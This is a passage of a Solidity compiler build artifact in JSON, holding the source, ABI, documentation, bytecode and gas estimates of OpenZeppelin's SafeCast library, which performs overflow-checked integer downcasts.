downcasted uint96 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint96).\\n     *\\n     * Counterpart to Solidity's `uint96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toUint96(uint256 value) internal pure returns (uint96) {\\n        if (value > type(uint96).max) {\\n            revert SafeCastOverflowedUintDowncast(96, value);\\n        }\\n        return uint96(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint88 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint88).\\n     *\\n     * Counterpart to Solidity's `uint88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toUint88(uint256 value) internal pure returns (uint88) {\\n        if (value > type(uint88).max) {\\n            revert SafeCastOverflowedUintDowncast(88, value);\\n        }\\n        return uint88(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint80 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint80).\\n     *\\n     * Counterpart to Solidity's `uint80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toUint80(uint256 value) internal pure returns (uint80) {\\n        if (value > type(uint80).max) {\\n            revert SafeCastOverflowedUintDowncast(80, value);\\n        }\\n        return uint80(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint72 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint72).\\n     *\\n     * Counterpart to Solidity's `uint72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toUint72(uint256 value) internal pure returns (uint72) {\\n        if (value > type(uint72).max) {\\n            revert SafeCastOverflowedUintDowncast(72, value);\\n        }\\n        return uint72(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint64 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint64).\\n     *\\n     * Counterpart to Solidity's `uint64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toUint64(uint256 value) internal pure returns (uint64) {\\n        if (value > type(uint64).max) {\\n            revert SafeCastOverflowedUintDowncast(64, value);\\n        }\\n        return uint64(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint56 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint56).\\n     *\\n     * Counterpart to Solidity's `uint56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toUint56(uint256 value) internal pure returns (uint56) {\\n        if (value > type(uint56).max) {\\n            revert SafeCastOverflowedUintDowncast(56, value);\\n        }\\n        return uint56(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint48 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint48).\\n     *\\n     * Counterpart to Solidity's `uint48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toUint48(uint256 value) internal pure returns (uint48) {\\n        if (value > type(uint48).max) {\\n            revert SafeCastOverflowedUintDowncast(48, value);\\n        }\\n        return uint48(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint40 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint40).\\n     *\\n     * Counterpart to Solidity's `uint40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toUint40(uint256 value) internal pure returns (uint40) {\\n        if (value > type(uint40).max) {\\n            revert SafeCastOverflowedUintDowncast(40, value);\\n        }\\n        return uint40(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint32 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint32).\\n     *\\n     * Counterpart to Solidity's `uint32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toUint32(uint256 value) internal pure returns (uint32) {\\n        if (value > type(uint32).max) {\\n            revert SafeCastOverflowedUintDowncast(32, value);\\n        }\\n        return uint32(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint24 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint24).\\n     *\\n     * Counterpart to Solidity's `uint24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toUint24(uint256 value) internal pure returns (uint24) {\\n        if (value > type(uint24).max) {\\n            revert SafeCastOverflowedUintDowncast(24, value);\\n        }\\n        return uint24(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint16 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint16).\\n     *\\n     * Counterpart to Solidity's `uint16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toUint16(uint256 value) internal pure returns (uint16) {\\n        if (value > type(uint16).max) {\\n            revert SafeCastOverflowedUintDowncast(16, value);\\n        }\\n        return uint16(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint8 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint8).\\n     *\\n     * Counterpart to Solidity's `uint8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toUint8(uint256 value) internal pure returns (uint8) {\\n        if (value > type(uint8).max) {\\n            revert SafeCastOverflowedUintDowncast(8, value);\\n        }\\n        return uint8(value);\\n    }\\n\\n    /**\\n     * @dev Converts a signed int256 into an unsigned uint256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be greater than or equal to 0.\\n     */\\n    function toUint256(int256 value) internal pure returns (uint256) {\\n        if (value < 0) {\\n            revert SafeCastOverflowedIntToUint(value);\\n        }\\n        return uint256(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int248 from int256, reverting on\\n     * overflow (when the input is less than smallest int248 or\\n     * greater than largest int248).\\n     *\\n     * Counterpart to Solidity's `int248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toInt248(int256 value) internal pure returns (int248 downcasted) {\\n        downcasted = int248(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(248, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int240 from int256, reverting on\\n     * overflow (when the input is less than smallest int240 or\\n     * greater than largest int240).\\n     *\\n     * Counterpart to Solidity's `int240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toInt240(int256 value) internal pure returns (int240 downcasted) {\\n        downcasted = int240(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(240, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int232 from int256, reverting on\\n     * overflow (when the input is less than smallest int232 or\\n     * greater than largest int232).\\n     *\\n     * Counterpart to Solidity's `int232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toInt232(int256 value) internal pure returns (int232 downcasted) {\\n        downcasted = int232(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(232, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int224 from int256, reverting on\\n     * overflow (when the input is less than smallest int224 or\\n     * greater than largest int224).\\n     *\\n     * Counterpart to Solidity's `int224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toInt224(int256 value) internal pure returns (int224 downcasted) {\\n        downcasted = int224(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(224, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int216 from int256, reverting on\\n     * overflow (when the input is less than smallest int216 or\\n     * greater than largest int216).\\n     *\\n     * Counterpart to Solidity's `int216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toInt216(int256 value) internal pure returns (int216 downcasted) {\\n        downcasted = int216(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(216, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int208 from int256, reverting on\\n     * overflow (when the input is less than smallest int208 or\\n     * greater than largest int208).\\n     *\\n     * Counterpart to Solidity's `int208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toInt208(int256 value) internal pure returns (int208 downcasted) {\\n        downcasted = int208(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(208, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int200 from int256, reverting on\\n     * overflow (when the input is less than smallest int200 or\\n     * greater than largest int200).\\n     *\\n     * Counterpart to Solidity's `int200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toInt200(int256 value) internal pure returns (int200 downcasted) {\\n        downcasted = int200(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(200, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int192 from int256, reverting on\\n     * overflow (when the input is less than smallest int192 or\\n     * greater than largest int192).\\n     *\\n     * Counterpart to Solidity's `int192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toInt192(int256 value) internal pure returns (int192 downcasted) {\\n        downcasted = int192(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(192, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int184 from int256, reverting on\\n     * overflow (when the input is less than smallest int184 or\\n     * greater than largest int184).\\n     *\\n     * Counterpart to Solidity's `int184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toInt184(int256 value) internal pure returns (int184 downcasted) {\\n        downcasted = int184(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(184, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int176 from int256, reverting on\\n     * overflow (when the input is less than smallest int176 or\\n     * greater than largest int176).\\n     *\\n     * Counterpart to Solidity's `int176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toInt176(int256 value) internal pure returns (int176 downcasted) {\\n        downcasted = int176(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(176, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int168 from int256, reverting on\\n     * overflow (when the input is less than smallest int168 or\\n     * greater than largest int168).\\n     *\\n     * Counterpart to Solidity's `int168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toInt168(int256 value) internal pure returns (int168 downcasted) {\\n        downcasted = int168(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(168, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int160 from int256, reverting on\\n     * overflow (when the input is less than smallest int160 or\\n     * greater than largest int160).\\n     *\\n     * Counterpart to Solidity's `int160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toInt160(int256 value) internal pure returns (int160 downcasted) {\\n        downcasted = int160(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(160, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int152 from int256, reverting on\\n     * overflow (when the input is less than smallest int152 or\\n     * greater than largest int152).\\n     *\\n     * Counterpart to Solidity's `int152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toInt152(int256 value) internal pure returns (int152 downcasted) {\\n        downcasted = int152(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(152, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int144 from int256, reverting on\\n     * overflow (when the input is less than smallest int144 or\\n     * greater than largest int144).\\n     *\\n     * Counterpart to Solidity's `int144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toInt144(int256 value) internal pure returns (int144 downcasted) {\\n        downcasted = int144(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(144, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int136 from int256, reverting on\\n     * overflow (when the input is less than smallest int136 or\\n     * greater than largest int136).\\n     *\\n     * Counterpart to Solidity's `int136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toInt136(int256 value) internal pure returns (int136 downcasted) {\\n        downcasted = int136(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(136, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int128 from int256, reverting on\\n     * overflow (when the input is less than smallest int128 or\\n     * greater than largest int128).\\n     *\\n     * Counterpart to Solidity's `int128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toInt128(int256 value) internal pure returns (int128 downcasted) {\\n        downcasted = int128(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(128, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int120 from int256, reverting on\\n     * overflow (when the input is less than smallest int120 or\\n     * greater than largest int120).\\n     *\\n     * Counterpart to Solidity's `int120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toInt120(int256 value) internal pure returns (int120 downcasted) {\\n        downcasted = int120(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(120, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int112 from int256, reverting on\\n     * overflow (when the input is less than smallest int112 or\\n     * greater than largest int112).\\n     *\\n     * Counterpart to Solidity's `int112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toInt112(int256 value) internal pure returns (int112 downcasted) {\\n        downcasted = int112(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(112, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int104 from int256, reverting on\\n     * overflow (when the input is less than smallest int104 or\\n     * greater than largest int104).\\n     *\\n     * Counterpart to Solidity's `int104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toInt104(int256 value) internal pure returns (int104 downcasted) {\\n        downcasted = int104(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(104, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int96 from int256, reverting on\\n     * overflow (when the input is less than smallest int96 or\\n     * greater than largest int96).\\n     *\\n     * Counterpart to Solidity's `int96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toInt96(int256 value) internal pure returns (int96 downcasted) {\\n        downcasted = int96(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(96, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int88 from int256, reverting on\\n     * overflow (when the input is less than smallest int88 or\\n     * greater than largest int88).\\n     *\\n     * Counterpart to Solidity's `int88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toInt88(int256 value) internal pure returns (int88 downcasted) {\\n        downcasted = int88(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(88, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int80 from int256, reverting on\\n     * overflow (when the input is less than smallest int80 or\\n     * greater than largest int80).\\n     *\\n     * Counterpart to Solidity's `int80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toInt80(int256 value) internal pure returns (int80 downcasted) {\\n        downcasted = int80(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(80, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int72 from int256, reverting on\\n     * overflow (when the input is less than smallest int72 or\\n     * greater than largest int72).\\n     *\\n     * Counterpart to Solidity's `int72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toInt72(int256 value) internal pure returns (int72 downcasted) {\\n        downcasted = int72(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(72, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int64 from int256, reverting on\\n     * overflow (when the input is less than smallest int64 or\\n     * greater than largest int64).\\n     *\\n     * Counterpart to Solidity's `int64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toInt64(int256 value) internal pure returns (int64 downcasted) {\\n        downcasted = int64(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(64, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int56 from int256, reverting on\\n     * overflow (when the input is less than smallest int56 or\\n     * greater than largest int56).\\n     *\\n     * Counterpart to Solidity's `int56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toInt56(int256 value) internal pure returns (int56 downcasted) {\\n        downcasted = int56(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(56, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int48 from int256, reverting on\\n     * overflow (when the input is less than smallest int48 or\\n     * greater than largest int48).\\n     *\\n     * Counterpart to Solidity's `int48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toInt48(int256 value) internal pure returns (int48 downcasted) {\\n        downcasted = int48(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(48, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int40 from int256, reverting on\\n     * overflow (when the input is less than smallest int40 or\\n     * greater than largest int40).\\n     *\\n     * Counterpart to Solidity's `int40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toInt40(int256 value) internal pure returns (int40 downcasted) {\\n        downcasted = int40(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(40, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int32 from int256, reverting on\\n     * overflow (when the input is less than smallest int32 or\\n     * greater than largest int32).\\n     *\\n     * Counterpart to Solidity's `int32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toInt32(int256 value) internal pure returns (int32 downcasted) {\\n        downcasted = int32(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(32, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int24 from int256, reverting on\\n     * overflow (when the input is less than smallest int24 or\\n     * greater than largest int24).\\n     *\\n     * Counterpart to Solidity's `int24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toInt24(int256 value) internal pure returns (int24 downcasted) {\\n        downcasted = int24(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(24, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int16 from int256, reverting on\\n     * overflow (when the input is less than smallest int16 or\\n     * greater than largest int16).\\n     *\\n     * Counterpart to Solidity's `int16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toInt16(int256 value) internal pure returns (int16 downcasted) {\\n        downcasted = int16(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(16, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int8 from int256, reverting on\\n     * overflow (when the input is less than smallest int8 or\\n     * greater than largest int8).\\n     *\\n     * Counterpart to Solidity's `int8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toInt8(int256 value) internal pure returns (int8 downcasted) {\\n        downcasted = int8(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(8, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts an unsigned uint256 into a signed int256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be less than or equal to maxInt256.\\n     */\\n    function toInt256(uint256 value) internal pure returns (int256) {\\n        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive\\n        if (value > uint256(type(int256).max)) {\\n            revert SafeCastOverflowedUintToInt(value);\\n        }\\n        return int256(value);\\n    }\\n\\n    /**\\n     * @dev Cast a boolean (false or true) to a uint256 (0 or 1) with no jump.\\n     */\\n    function toUint(bool b) internal pure returns (uint256 u) {\\n        assembly (\\\"memory-safe\\\") {\\n            u := iszero(iszero(b))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x195533c86d0ef72bcc06456a4f66a9b941f38eb403739b00f21fd7c1abd1ae54\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/math/SafeCast.sol":{"SafeCast":{"abi":[{"inputs":[{"internalType":"uint8","name":"bits","type":"uint8"},{"internalType":"int256","name":"value","type":"int256"}],"name":"SafeCastOverflowedIntDowncast","type":"error"},{"inputs":[{"internalType":"int256","name":"value","type":"int256"}],"name":"SafeCastOverflowedIntToUint","type":"error"},{"inputs":[{"internalType":"uint8","name":"bits","type":"uint8"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"SafeCastOverflowedUintDowncast","type":"error"},{"inputs":[{"internalType":"uint256","name":"value","type":"uint256"}],"name":"SafeCastOverflowedUintToInt","type":"error"}],"devdoc":{"details":"Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow checks. Downcasting from uint256/int256 in Solidity does not revert on overflow. This can easily result in undesired exploitation or bugs, since developers usually assume that overflows raise errors. `SafeCast` restores this intuition by reverting the transaction when such an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.","errors":{"SafeCastOverflowedIntDowncast(uint8,int256)":[{"details":"Value doesn't fit in an int of `bits` size."}],"SafeCastOverflowedIntToUint(int256)":[{"details":"An int value doesn't fit in an uint of `bits` size."}],"SafeCastOverflowedUintDowncast(uint8,uint256)":[{"details":"Value doesn't fit in an uint of `bits` size."}],"SafeCastOverflowedUintToInt(uint256)":[{"details":"An uint value doesn't fit in an int of `bits` size."}]},"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220a1de9ad8b7edba3a0266b7696831adbc8bf938a4add94f0f5c248d5159c4973e64736f6c634300081c0033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 0xDE SWAP11 0xD8 0xB7 0xED 0xBA GASPRICE MUL PUSH7 0xB7696831ADBC8B 0xF9 CODESIZE LOG4 0xAD 0xD9 0x4F 0xF TLOAD 0x24 DUP14 MLOAD MSIZE 0xC4 SWAP8 RETURNDATACOPY PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"769:34173:7:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220a1de9ad8b7edba3a0266b7696831adbc8bf938a4add94f0f5c248d5159c4973e64736f6c634300081c0033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 0xDE SWAP11 0xD8 0xB7 0xED 0xBA GASPRICE MUL PUSH7 0xB7696831ADBC8B 0xF9 CODESIZE LOG4 0xAD 0xD9 0x4F 0xF TLOAD 0x24 DUP14 MLOAD MSIZE 0xC4 SWAP8 RETURNDATACOPY PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"769:34173:7:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"toInt104(int256)":"infinite","toInt112(int256)":"infinite","toInt120(int256)":"infinite","toInt128(int256)":"infinite","toInt136(int256)":"infinite","toInt144(int256)":"infinite","toInt152(int256)":"infinite","toInt16(int256)":"infinite","toInt160(int256)":"infinite","toInt168(int256)":"infinite","toInt176(int256)":"infinite","toInt184(int256)":"infinite","toInt192(int256)":"infinite","toInt200(int256)":"infinite","toInt208(int256)":"infinite","toInt216(int256)":"infinite","toInt224(int256)":"infinite","toInt232(int256)":"infinite","toInt24(int256)":"infinite","toInt240(int256)":"infinite","toInt248(int256)":"infinite","toInt256(uint256)":"infinite","toInt32(int256)":"infinite","toInt40(int256)":"infinite","toInt48(int256)":"infinite","toInt56(int256)":"infinite","toInt64(int256)":"infinite","toInt72(int256)":"infinite","toInt8(int256)":"infinite","toInt80(int256)":"infinite","toInt88(int256)":"infinite","toInt96(int256)":"infinite","toUint(bool)":"infinite","toUint104(uint256)":"infinite","toUint112(uint256)":"infinite","toUint120(uint256)":"infinite","toUint128(uint256)":"infinite","toUint136(uint256)":"infinite","toUint144(uint256)":"infinite","toUint152(uint256)":"infinite","toUint16(uint256)":"infinite","toUint160(uint256)":"infinite","toUint168(uint256)":"infinite","toUint176(uint256)":"infinite","toUint184(uint256)":"infinite","toUint192(uint256)":"infinite","toUint200(uint256)":"infinite","toUint208(uint256)":"infinite","toUint216(uint256)":"infinite","toUint224(uint256)":"infinite","toUint232(uint256)":"infinite","toUint24(uint256)":"infinite","toUint240(uint256)":"infinite","toUint248(uint256)":"infinite","toUint256(int256)":"infinite","toUint32(uint256)":"infinite","toUint40(uint256)":"infinite","toUint48(uint256)":"infinite","toUint56(uint256)":"infinite","toUint64(uint256)":"infinite","toUint72(uint256)":"infinite","toUint8(uint256)":"infinite","toUint80(uint256)":"infinite","toUint88(uint256)":"infinite","toUint96(uint256)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"bits\",\"type\":\"uint8\"},{\"internalType\":\"int256\",\"name\":\"value\",\"type\":\"int256\"}],\"name\":\"SafeCastOverflowedIntDowncast\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"int256\",\"name\":\"value\",\"type\":\"int256\"}],\"name\":\"SafeCastOverflowedIntToUint\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"bits\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"SafeCastOverflowedUintDowncast\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"SafeCastOverflowedUintToInt\",\"type\":\"error\"}],\"devdoc\":{\"details\":\"Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow checks. Downcasting from uint256/int256 in Solidity does not revert on overflow. This can easily result in undesired exploitation or bugs, since developers usually assume that overflows raise errors. `SafeCast` restores this intuition by reverting the transaction when such an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"errors\":{\"SafeCastOverflowedIntDowncast(uint8,int256)\":[{\"details\":\"Value doesn't fit in an int of `bits` size.\"}],\"SafeCastOverflowedIntToUint(int256)\":[{\"details\":\"An int value doesn't fit in an uint of `bits` size.\"}],\"SafeCastOverflowedUintDowncast(uint8,uint256)\":[{\"details\":\"Value doesn't fit in an uint of `bits` size.\"}],\"SafeCastOverflowedUintToInt(uint256)\":[{\"details\":\"An uint value doesn't fit in an int of `bits` size.\"}]},\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/math/SafeCast.sol\":\"SafeCast\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/math/SafeCast.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SafeCast.sol)\\n// This file was procedurally generated from scripts/generate/templates/SafeCast.js.\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow\\n * checks.\\n *\\n * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\\n * easily result in undesired exploitation or bugs, since developers usually\\n * assume that overflows raise errors. `SafeCast` restores this intuition 